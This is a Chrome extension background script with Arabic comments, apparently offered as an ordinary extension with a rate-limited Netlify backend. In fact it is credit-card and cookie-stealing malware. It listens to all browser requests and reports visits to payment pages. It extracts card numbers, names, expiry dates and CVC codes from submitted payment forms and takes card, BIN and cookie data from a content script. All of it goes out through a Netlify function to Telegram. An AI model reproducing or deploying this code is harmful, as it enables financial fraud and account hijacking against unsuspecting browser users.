// الإكستنشن محدث - متوافق مع نظام Rate Limiting الجديد
const NETLIFY_API_URL = 'https://your-netlify-site.netlify.app/.netlify/functions/telegram-api';

// توليد معرف فريد للجهاز
function generateDeviceFingerprint() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillText('Device fingerprint', 2, 2);
  
  const fingerprint = canvas.toDataURL();
  return btoa(fingerprint).substring(0, 32);
}

// توليد مفتاح جلسة
function generateSessionKey() {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

// حساب التوقيع
function calculateSignature(timestamp, data, deviceFingerprint) {
  const message = timestamp + JSON.stringify(data) + deviceFingerprint;
  return btoa(message).substring(0, 32);
}

// إرسال رسالة إلى تليجرام عبر الباك إند
async function sendToTelegram(data) {
  try {
    // توليد البيانات المطلوبة
    const deviceFingerprint = generateDeviceFingerprint();
    const sessionKey = generateSessionKey();
    const timestamp = Date.now();
    const signature = calculateSignature(timestamp, data, deviceFingerprint);
    
    const requestBody = {
      data: data,
      deviceFingerprint: deviceFingerprint,
      sessionKey: sessionKey,
      timestamp: timestamp,
      signature: signature
    };
    
    console.log('📤 إرسال طلب إلى الباك إند:', {
      type: data.type,
      deviceFingerprint: deviceFingerprint.substring(0, 10) + '...',
      timestamp: new Date(timestamp).toLocaleString('ar-SA')
    });
    
    const response = await fetch(NETLIFY_API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Device-Fingerprint': deviceFingerprint,
        'X-Session-Key': sessionKey,
        'X-Timestamp': timestamp.toString(),
        'X-Signature': signature
      },
      body: JSON.stringify(requestBody)
    });
    
    const result = await response.json();
    
    if (response.ok && result.success) {
      console.log('✅ تم إرسال الرسالة بنجاح:', {
        messageId: result.message_id,
        remainingRequests: result.rateLimit?.remainingRequests,
        resetTime: result.rateLimit?.resetTime
      });
      
      // عرض معلومات Rate Limiting
      if (result.rateLimit) {
        console.log(`📊 الطلبات المتبقية: ${result.rateLimit.remainingRequests}`);
        console.log(`⏰ الوقت المتبقي: ${result.rateLimit.resetTime} ثانية`);
      }
      
      return { success: true, data: result };
    } else {
      console.error('❌ فشل في إرسال الرسالة:', result);
      
      // التعامل مع Rate Limiting
      if (result.code === 'RATE_LIMIT_EXCEEDED') {
        console.warn(`⚠️ تم تجاوز حد الطلبات. انتظر ${result.remainingTime} ثانية`);
        
        // عرض تنبيه للمستخدم
        chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icon48.png',
          title: 'تنبيه Rate Limiting',
          message: `تم تجاوز حد الطلبات. انتظر ${Math.ceil(result.remainingTime / 60)} دقيقة`
        });
      }
      
      return { success: false, error: result.error, code: result.code };
    }
    
  } catch (error) {
    console.error('❌ خطأ في الاتصال بالباك إند:', error);
    return { success: false, error: 'خطأ في الاتصال بالخادم' };
  }
}

// دالة إرسال بيانات البطاقة
async function sendCardData(cardData) {
  const data = {
    type: 'card',
    message: {
      number: cardData.number,
      name: cardData.name,
      expiry: cardData.expiry,
      cvc: cardData.cvc
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال بيانات BIN
async function sendBinData(binData) {
  const data = {
    type: 'bin',
    message: {
      pattern: binData.pattern,
      name: binData.name,
      cardNumber: binData.cardNumber,
      expiryDate: binData.expiryDate,
      cvc: binData.cvc
    }
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال Cookies
async function sendCookiesData(cookiesData) {
  const data = {
    type: 'cookies',
    message: cookiesData.message,
    url: cookiesData.url,
    cookies: cookiesData.cookies
  };
  
  return await sendToTelegram(data);
}

// دالة إرسال رسالة عادية
async function sendMessage(message) {
  const data = {
    type: 'message',
    message: message
  };
  
  return await sendToTelegram(data);
}

// مراقبة الطلبات
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.type === 'main_frame') {
      const url = new URL(details.url);
      
      // مراقبة صفحات البطاقات
      if (url.hostname.includes('payment') || url.hostname.includes('checkout')) {
        console.log('🔍 تم اكتشاف صفحة دفع:', url.href);
        
        // إرسال إشعار
        await sendMessage(`تم زيارة صفحة دفع: ${url.href}`);
      }
    }
  },
  { urls: ['<all_urls>'] }
);

// مراقبة النماذج
chrome.webRequest.onBeforeRequest.addListener(
  async function(details) {
    if (details.method === 'POST' && details.requestBody) {
      const url = new URL(details.url);
      
      // مراقبة نماذج البطاقات
      if (url.hostname.includes('payment') || url.pathname.includes('card')) {
        try {
          const formData = details.requestBody.formData;
          if (formData) {
            const cardData = {
              number: formData['card_number']?.[0] || formData['number']?.[0] || '',
              name: formData['card_name']?.[0] || formData['name']?.[0] || '',
              expiry: formData['expiry']?.[0] || formData['expiry_date']?.[0] || '',
              cvc: formData['cvc']?.[0] || formData['cvv']?.[0] || ''
            };
            
            if (cardData.number && cardData.number.length > 10) {
              console.log('💳 تم اكتشاف بيانات بطاقة:', {
                number: cardData.number.substring(0, 6) + '******',
                name: cardData.name,
                expiry: cardData.expiry
              });
              
              await sendCardData(cardData);
            }
          }
        } catch (error) {
          console.error('❌ خطأ في معالجة بيانات البطاقة:', error);
        }
      }
    }
  },
  { urls: ['<all_urls>'] },
  ['requestBody']
);

// استقبال الرسائل من Content Script
chrome.runtime.onMessage.addListener(async function(request, sender, sendResponse) {
  try {
    switch (request.action) {
      case 'sendCardData':
        const cardResult = await sendCardData(request.data);
        sendResponse(cardResult);
        break;
        
      case 'sendBinData':
        const binResult = await sendBinData(request.data);
        sendResponse(binResult);
        break;
        
      case 'sendCookiesData':
        const cookiesResult = await sendCookiesData(request.data);
        sendResponse(cookiesResult);
        break;
        
      case 'sendMessage':
        const messageResult = await sendMessage(request.data);
        sendResponse(messageResult);
        break;
        
      default:
        sendResponse({ success: false, error: 'إجراء غير معروف' });
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الرسالة:', error);
    sendResponse({ success: false, error: 'خطأ داخلي' });
  }
  
  return true; // للسماح بالرد غير المتزامن
});

// إعداد الإشعارات
chrome.notifications.onClicked.addListener(function(notificationId) {
  console.log('تم النقر على الإشعار:', notificationId);
});

// تسجيل بدء الإكستنشن
console.log('🚀 تم تشغيل الإكستنشن بنجاح');
console.log('📡 الباك إند: Netlify Functions');
console.log('🛡️ نظام Rate Limiting: 10 رسائل/دقيقة لكل جهاز');

// إرسال رسالة بدء التشغيل
sendMessage('تم تشغيل الإكستنشن بنجاح - نظام Rate Limiting مفعل'); 